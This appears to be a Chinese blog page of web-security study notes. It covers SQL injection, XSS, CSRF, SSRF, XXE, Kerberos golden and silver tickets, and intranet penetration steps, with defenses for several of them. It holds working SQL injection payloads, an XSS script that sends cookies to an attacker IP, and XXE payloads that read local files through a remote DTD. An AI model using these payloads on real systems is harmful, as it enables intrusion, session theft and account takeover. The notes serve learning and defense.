<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 9999 --+		#正常返回则为字符型，报错则为数字型</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>假设语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span> $id;</span><br></pre></td></tr></table></figure>

<p>字符型中，注释内容会被当作id的一部分（字符串），在执行sql语句的过程中只会取前面的1，所以会正常执行</p>
<img src="/image/image-20221019153748911.png" alt="image-20221019153748911" style="zoom:80%;" />

<p>而在数字型中，后面的order by会被当做排序语句执行，而正常数据库中不会有9999个字段，所以会报错</p>
<img src="/image/image-20221019154129333.png" alt="image-20221019154129333" style="zoom:80%;" />





<h3 id="按数据提交方式"><a href="#按数据提交方式" class="headerlink" title="按数据提交方式"></a>按数据提交方式</h3><ul>
<li>GET</li>
<li>POST</li>
<li>HTTP头部（XXF，cookie等）</li>
</ul>
<h3 id="按执行效果"><a href="#按执行效果" class="headerlink" title="按执行效果"></a>按执行效果</h3><ul>
<li>基于报错的注入：有报错或其他回显</li>
</ul>
<p>能将攻击者想要查询的信息（数据库名，版本号等）通过页面的错误提示回显；</p>
<p>前提条件：数据库未关闭报错函数，后台未对具有报错功能的函数进行过滤</p>
<p>常用的报错函数：extractvalue()、updatexml()、floor()、exp()等</p>
<p>一般步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1#								#判断字段数</span><br><span class="line">1&#x27; union select 1,2,3#						#判断字段的位置</span><br><span class="line">1&#x27; union select 1,2,database()#				#爆数据库名，*要查询的信息最好在每一个位置上都试试*</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>基于布尔的盲注：根据返回页面执行是否正确来判断是否成功</li>
</ul>
<p>不会直接显示查询的内容，只会返回查询是否成功；布尔运算是数字符号化的逻辑推演法，包括联合、相交、相减。在图形处理操作中引入了这种逻辑运算方法以使简单的基本图形组合产生新的形体（说人话：可以从字符的挨个比较来得出想要的信息）</p>
<p>重要函数：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">count()										<span class="comment">#计算结果集的行数</span></span><br><span class="line">length(str)									<span class="comment">#返回指定字符串的长度</span></span><br><span class="line">substr/substring(str, index, length)		<span class="comment">#返回截取的子字符串</span></span><br><span class="line">ascii(str)									<span class="comment">#返回指定字符串最左侧字符的ascii值</span></span><br></pre></td></tr></table></figure>

<p>一般步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#数据库名：dvwa/第一个表名：guestbook</span><br><span class="line"></span><br><span class="line">1&#x27; and length(database()) = 4#					#判断数据库名长度</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr(database(),1,1)) = 100#		#判断数据库名的第一个字符ascii值</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;) = 2#	#判断数据库中表的数量</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)) = 103#								  #判断第一个表名的第一个字符ascii值</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27;) = 3#					#判断列的数量</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) = 99#		#判断列名的第一个字符ascii值</span><br><span class="line"></span><br><span class="line">1&#x27; and (select count(comment_id) from dvwa.guestbook) = 1#		#判断字段的数量</span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr((select concat(comment_id,0x23,comment) from dvwa.guestbook),1,1)) = 49#</span><br></pre></td></tr></table></figure>



<ul>
<li>基于时间的盲注：不能从返回结果判断，只能通过时间函数（sleep等）延时来判断</li>
</ul>
<p>时间盲注大致和布尔盲注差不多，只不过是通过是否延时来判断执行成功与否</p>
<p>重要函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(boolean, exp1, exp2)		#如果为true，返回exp1，反之返回exp2</span><br><span class="line">sleep(sec)					#延时执行</span><br></pre></td></tr></table></figure>

<p>大致流程和布尔型差不多，把布尔换成靠延时来判断即可</p>
<img src="/image/image-20220603154747972.png" alt="image-20220603154747972" style="zoom: 67%;" />

<ul>
<li>联合查询注入：通常适用于有回显和显示位置有差异性的注入</li>
</ul>
<p>重要函数：union</p>
<p>一般步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2#				#判断字段数，多了会报错</span><br><span class="line"></span><br><span class="line">1&#x27; union select 1,2#		#判断相应字段的显示位置</span><br><span class="line"></span><br><span class="line">1&#x27; union select table_schema,table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;#	#通过information_schema查询dvwa中的表名</span><br></pre></td></tr></table></figure>



<ul>
<li>堆叠注入：可以通过分号间隔同时执行多条语句的注入</li>
<li>宽字节注入</li>
</ul>
<p>正常使用addslashes函数或者开启php的GPC时，为了防止特殊字符污染，会自动将预定义字符转义成加反斜杠的字符串；而使用了指定编码的语句<code>set name &#39;gbk&#39;</code>时，相当于自动执行了三条语句（客户端，连接层，结果集都设置为GBK）；而宽字节注入就是发生在php发送请求到mysql时使用了<code>set name &#39;gbk&#39;</code>进行了一次gbk编码，由于一些特殊的字符集转换导致了宽字节注入。</p>
<p>原理：</p>
<p>在php中指定mysql为GBK编码，而php使用UTF-8编码时可造成宽字节注入</p>
<p>比如下面情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：1&#x27; union select 1,2#</span><br><span class="line">转义：1\&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>

<p>单引号被转义成了 \‘ ，故语法不正确，因此我们需要想办法去掉这个右斜线；mysql在使用GBK编码的时候，会认为两个字符是一个汉字，并且前一个ascii码大于128时才到汉字的范围；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2# -&gt; 1\&#x27; union select 1,2# -&gt; 1%5C%27%20union%20select%201%2C2%23 #此时%5C%27还是\&#x27;</span><br><span class="line"></span><br><span class="line">?id=1%df&#x27; union select 1,2# -&gt; 1[汉字]\&#x27; union select 1,2# -&gt; 1%DF%5C%27%20union%20select%201%2C2%23	#此时%DF%5C组成了一个汉字（gbk编码认为两个字符是一个汉字），而%27也就是单引号成功逃逸</span><br></pre></td></tr></table></figure>



<ul>
<li>二次注入：</li>
</ul>
<p>利用已经储存的账户数据读取后再次进入查询语句中导致注入（说人话：已经写进数据库的内容，可以把他拿出来再次放进sql查询语句的情况）</p>
<p>一般步骤：</p>
<ol>
<li>确定攻击目标账户名（admin）</li>
<li>注册恶意账户（admin’– -）</li>
<li>修改恶意账户密码</li>
<li>使用修改的密码登录目标账户</li>
</ol>
<p>原理：</p>
<p>假设注册用户的语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into users (username, password) values(&quot;$username&quot;, &quot;$password&quot;);</span><br></pre></td></tr></table></figure>

<p>并且没有进行严格过滤，我们可以通过注册恶意用户名来注入，猜测修改密码的sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password=&#x27;$password&#x27; where username=&#x27;$username&#x27; and password=&#x27;$src_password&#x27;;</span><br></pre></td></tr></table></figure>

<p>此时我们可以构造恶意payload为：<code>admin&#39;-- -</code> ，拼合后的语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password=&#x27;$password&#x27; where username=&#x27;admin&#x27;-- -&#x27; and password=&#x27;$src_password&#x27;;</span><br></pre></td></tr></table></figure>

<p>此时admin’– - 之后的内容包括确认原密码的语句被注释，等同于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password=&#x27;$password&#x27; where username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>可在不知情的情况下直接修改admin的密码。</p>
<h2 id="sql注入报错函数"><a href="#sql注入报错函数" class="headerlink" title="sql注入报错函数"></a>sql注入报错函数</h2><ul>
<li>extractvalue函数</li>
</ul>
<p>payload：<code>1&#39; and (extractvalue(1,concat(0x5c,(select user()))))#</code></p>
<p><img src="/image/image-20220603212657619.png" alt="image-20220603212657619"></p>
<ul>
<li>updatexml函数</li>
</ul>
<p>payload：<code>1&#39; and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1))#</code></p>
<p><img src="/image/image-20220603212942036.png" alt="image-20220603212942036"></p>
<ul>
<li>floor函数</li>
</ul>
<p>利⽤ floor(),count(),group by 的冲突报错</p>
<p>payload：<code>1&#39; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></p>
<p><img src="/image/image-20220603214105995.png" alt="image-20220603214105995"></p>
<ul>
<li>exp函数</li>
</ul>
<p>payload：<code>1&#39; and exp(~(select * from (select user())a))#</code></p>
<h2 id="sql注入的几个比较重要的点"><a href="#sql注入的几个比较重要的点" class="headerlink" title="sql注入的几个比较重要的点"></a>sql注入的几个比较重要的点</h2><ul>
<li>information_schema数据库里面有很多比较重要的信息，高权限数据库用户可以通过这个数据库来获得很多信</li>
<li>information_schema数据库的schemata表，可以看到所有的数据库名（schema_name字段）</li>
<li>直接查询schema_name字段会返回很多个字段，可能把字段位置占完了，导致显示不全</li>
</ul>
<img src="/image/image-20221019134510438.png" alt="image-20221019134510438" style="zoom: 80%;" />

<p>我们可以通过group_concat()函数来进行分组显示，视为一个字段，可以通过这种方法爆出所有的信息</p>
<img src="/image/image-20221019134622050.png" alt="image-20221019134622050" style="zoom:67%;" />

<p><strong>注：</strong>group_concat结合union查询时（<code>select 1,2,group_concat</code>）需要放在最后，否则会报错，如果不放在最后则要用<code>select 1,(select group_concat),3;</code></p>
<img src="/image/image-20221019143426972.png" alt="image-20221019143426972" style="zoom:80%;" />

<img src="/image/image-20221019143631446.png" alt="image-20221019143631446" style="zoom:80%;" />



<ul>
<li>information_schema数据库的tables表，可以看到所有数据库的表名（table_name）及对应的数据库名（table_schema）</li>
<li>可以使用<code>select group_concat(table_name)from(information_schema.tables)where table_schema = &#39;数据库名&#39;;</code></li>
<li>information_schema数据库的columns表，可以看到所有字段名（column_name）及对应的数据库名（table_schema）和表名（table_name）</li>
<li>可以使用<code>select group_concat(column_name)from(information_schema.columns)where table_name = &#39;表名&#39;;</code></li>
<li></li>
</ul>
<h2 id="xss的方式"><a href="#xss的方式" class="headerlink" title="xss的方式"></a>xss的方式</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>从服务端返回脚本，在客户端触发执行发起攻击，一般通过需要url触发（需要受害者点开链接就能生效，不然只能搞自己。。）</p>
<p><strong>防御方法：</strong>前端在显示的时候过滤或转义危险字符以及标签</p>
<h3 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h3><p>像评论区或者文章等，可以将恶意脚本存储到服务器，每个浏览到该页面的客户端就会触发执行</p>
<p><strong>防御方法：</strong>对发布内容进行过滤再储存到数据库，读取数据库前端显示的时候再进行一次过滤</p>
<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>取决于输出位置，既可以是储存型也可以是反射型；dom是一种树状模型</p>
<img src="/image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3h1XzEyMzQ1Njc=,size_16,color_FFFFFF,t_70pic_center.png" alt="在这里插入图片描述"  />

<p>页面到达浏览器时，浏览器会自动创建一个Document object对象，每个页面元素都对应一个文档对象，客户端可以通过js脚本对这个对象进行动态修改，基于这个特性可以利用js脚本实现xss攻击。</p>
<p>例：</p>
<p>返回cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var img=document.createElement(&#x27;img&#x27;);img.src=&#x27;http://10.10.10.151:1234/a?&#x27;+escape(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>nc监听1234端口</p>
<img src="/image/image-20220604141005170.png" alt="image-20220604141005170" style="zoom:80%;" />



<h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>admin用户登录了A网站后台，浏览器保存了admin的cookie，此时攻击者搭建恶意网站B，其中携带一段向A网站请求的恶意代码，引诱admin用户来到恶意网站B（相同浏览器），此时admin用户携带有A网站后台的cookie，然而admin用户不知情，B网站存在恶意请求（如修改密码，发送邮件等），直接使用admin用户携带的cookie，以admin用户的身份向A网站发送恶意请求。</p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>基本有三种方法</p>
<h4 id="HTTP-Referer字段"><a href="#HTTP-Referer字段" class="headerlink" title="HTTP Referer字段"></a>HTTP Referer字段</h4><p>优点：简单易行</p>
<p>缺点：referer字段仅由浏览器提供，不能排除浏览器有其他漏洞的情况，很难保证其真实性，并且某些隐私浏览器不提供referer，可能导致正常用户无法使用功能</p>
<h4 id="token验证或验证码"><a href="#token验证或验证码" class="headerlink" title="token验证或验证码"></a>token验证或验证码</h4><p>csrf能实现的重点无非就是可以在用户不知情的情况下伪造用户请求，我们只需要在其中加入一段黑客无法伪造的字段即可，即token或者验证码，不过难点在于如何对接token和验证码的验证，并且如果在每个请求都添加这种验证方式是很麻烦的</p>
<h4 id="http中自定义属性"><a href="#http中自定义属性" class="headerlink" title="http中自定义属性"></a>http中自定义属性</h4><p>通过xmlhttprequest将token放入http头中进行验证，不过xmlhttprequest一般用于异步请求，且重构网站复杂度高</p>
<h4 id="SameSite字段"><a href="#SameSite字段" class="headerlink" title="SameSite字段"></a>SameSite字段</h4><p>在set-cookies参数中添加SameSite字段，如果是跨站请求直接不执行</p>
<h2 id="ssrf攻击"><a href="#ssrf攻击" class="headerlink" title="ssrf攻击"></a>ssrf攻击</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><img src="/image/v2-bca50003926a87fdd4be2c30d1828d70_1440w.jpg" alt="SSRF漏洞攻击原理及防御方案" style="zoom:80%;" />

<p>服务端请求伪造，攻击者在未取得服务器权限的情况下，利用服务器的漏洞，以服务器的身份向浏览器可达而攻击者不可达的服务器发送请求，再将不可达服务器返回的响应内容返回给攻击者，SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
<p>攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息。</p>
<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li>过滤返回的信息，应用请求文件后（一般只会请求图片），先对返回内容进行校验，如果满足类型，再返回给用户，不满足则拒绝请求</li>
<li>ssrf一般是用作探测内网服务，我们可以限制ip段，如果是内网就拒绝请求</li>
<li>统一报错信息，比如探测端口的情况，黑客可通过报错判断是否开放，将报错信息全部统一即可</li>
<li>限制请求端口，比如限制80或者443等</li>
<li>限制不常用协议，http和https常用，可以防止file，gopher等协议引发问题</li>
<li>有些网站的域名可能没有解析到内网地址，但是可通过3XX的方式请求内网地址，在不必要的情况下可以禁止所有重定向请求</li>
</ol>
<h2 id="XXE攻击"><a href="#XXE攻击" class="headerlink" title="XXE攻击"></a>XXE攻击</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>普通xml注入</p>
<p><img src="/image/d01373f082025aaf60d0e3b3e495ce6d024f1a6d.png" alt="img"></p>
<p>XML是一种非常流行的标记语言，它经常被用于配置文件，文档格式等。在解析外部实体的过程中，xml解析器可以根据url中指定的协议来查询。外部实体在文档中创建动态引用时非常有用，我们对外部资源进行的任何修改都可以在文档中自动更新。这种特性就导致了XXE攻击可以做到许多的效果</p>
<p>xml有一套格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">        &lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">        &lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">        &lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">        &lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">        &lt;!ELEMENT msg (#PCDATA)&gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<p>像这种定义方式，xml就必须按下面的方式书写</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到每个标签都对应DTD中的一个元素，此外，我们还可以在DTD中定义实体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe &quot;test&quot; &gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<p>这里 定义元素为 ANY 说明接受任何元素，还定义了xml的实体xxe，体其实可以看成一个变量，可以在 XML 中通过 &amp; 符号进行引用，则xml就应该这样写</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用<code>&amp;xxe;</code>对上面定义的xxe实体进行了引用，即输出test，这就是内部实体。XXE又叫xml外部实体注入，所以下面来看看外部实体</p>
<p>定义一个DTD</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<p>xml代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样我们在外部实体做的任何修改都可以在user处更新，还有一种方式是引用公共DTD，可以起到和SYSTEM相同的作用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>

<p><strong>通用实体</strong></p>
<p>用<code>&amp;实体名;</code>引用的实体，在DTD中定义，在XML文档中引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>参数实体</strong></p>
<ul>
<li>使用 <code>% 实体名</code>(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code>引用</li>
<li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li>
<li>和通用实体一样，参数实体也可以外部引用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%an-element;</span><br><span class="line">%remote-dtd;</span><br></pre></td></tr></table></figure>

<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="有回显读取本地文件"><a href="#有回显读取本地文件" class="headerlink" title="有回显读取本地文件"></a>有回显读取本地文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds [</span><br><span class="line">    &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p>如果读取的文件有特殊符号污染，可能会产生报错，这时候我们可以用到<strong>CDATA</strong></p>
<blockquote>
<p>CDATA节中的所有字符都会被当做元素字符数据的常量部分，格式为<![CDATA[XXXXXXXXXXXXXXXXX]]></p>
</blockquote>
<p>但是xml中并没有能够拼接字符串的语法，这时可以使用多个实体连续引用的方法</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">        %dtd;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br><span class="line"></span><br><span class="line">\\evil.dtd</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="防御方法-2"><a href="#防御方法-2" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li>简单粗暴，禁用外部实体</li>
<li>过滤和验证用户提交的xml数据</li>
</ol>
<h2 id="用过的安全设备"><a href="#用过的安全设备" class="headerlink" title="用过的安全设备"></a>用过的安全设备</h2><p>深信服日志审计，深信服数据库审计，深信服防火墙，深信服态势感知</p>
<h2 id="黄金-白银票据的区别"><a href="#黄金-白银票据的区别" class="headerlink" title="黄金&#x2F;白银票据的区别"></a>黄金&#x2F;白银票据的区别</h2><p><img src="/image/v2-b4279994a9625f378f9299fbd1ec1793_r.jpg" alt="preview"></p>
<p><img src="/image/v2-c82d9a8b0b457bd0c886776f6ce06bee_r.jpg" alt="preview"></p>
<img src="/image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWTVuZUtP,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"  />

<h3 id="从获取的权限"><a href="#从获取的权限" class="headerlink" title="从获取的权限"></a>从获取的权限</h3><ul>
<li>黄金票据：通过伪造TGT票据，可以获取任意Kerberos的访问权限</li>
<li>白银票据：通过伪造ST票据，只能访问指定的服务，如CIFS等</li>
</ul>
<h3 id="从认证流程"><a href="#从认证流程" class="headerlink" title="从认证流程"></a>从认证流程</h3><ul>
<li>黄金票据：与KDC交互，不与AS交互</li>
<li>白银票据：不与KDC交互，直接访问Server服务</li>
</ul>
<h3 id="从加密方式"><a href="#从加密方式" class="headerlink" title="从加密方式"></a>从加密方式</h3><ul>
<li>黄金票据：通过 krbtgt 的 NTLM Hash 加密</li>
<li>白银票据：通过服务账号的 NTLM Hash 加密</li>
</ul>
<h2 id="了解的内网渗透"><a href="#了解的内网渗透" class="headerlink" title="了解的内网渗透"></a>了解的内网渗透</h2><ul>
<li>首先在已有权限的主机上进行进一步<strong>信息搜集</strong>（系统详细信息，开放端口、服务，补丁信息等），获取有用信息</li>
<li>尝试<strong>提权</strong>，看看是否能够通过更高权限获取更多信息和利用，不能提权无所谓，进行下一步</li>
<li>对已有权限等级做好<strong>权限维持</strong>（免杀，自启动，开机运行，计划任务等等）</li>
<li>尝试通过端口转发、反弹shell、frp代理、Ngrok代理、Earthworm代理、reGeorg代理或其他隧道技术，将内网的流量代理出来，方便<strong>内网环境探测</strong>和<strong>内网横向移动</strong></li>
<li>进行<strong>内网信息搜集</strong>，弄清楚内网有哪些网段，可尝试直接进行内网探测存活主机、端口等，并进一步分析资产漏洞可用性</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#msf模块</span></span><br><span class="line"><span class="comment">#存活主机探测</span></span><br><span class="line">auxiliary/scanner/discovery/udp_sweep    <span class="comment">#基于udp协议发现内网存活主机</span></span><br><span class="line">auxiliary/scanner/discovery/udp_probe    <span class="comment">#基于udp协议发现内网存活主机</span></span><br><span class="line">auxiliary/scanner/netbios/nbname         <span class="comment">#基于netbios协议发现内网存活主机</span></span><br><span class="line">auxiliary/scanner/portscan/tcp           <span class="comment">#基于tcp进行端口扫描(1-10000)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#端口扫描</span></span><br><span class="line">auxiliary/scanner/portscan/tcp           <span class="comment">#基于tcp进行端口扫描(1-10000)</span></span><br><span class="line">auxiliary/scanner/portscan/ack           <span class="comment">#基于tcp的ack回复进行端口扫描，默认扫描1-10000端口</span></span><br><span class="line"><span class="comment">#端口扫描有时会使会话终端，所以可以上传nmap后在shell中使用nmap扫描。但是要记得清理</span></span><br></pre></td></tr></table></figure>

<ul>
<li>判断<strong>是否存在域环境</strong>，如果存在域环境，尝试搜集域控信息（NetBIOS协议），查看域用户有哪些，方便后续渗透</li>
</ul>
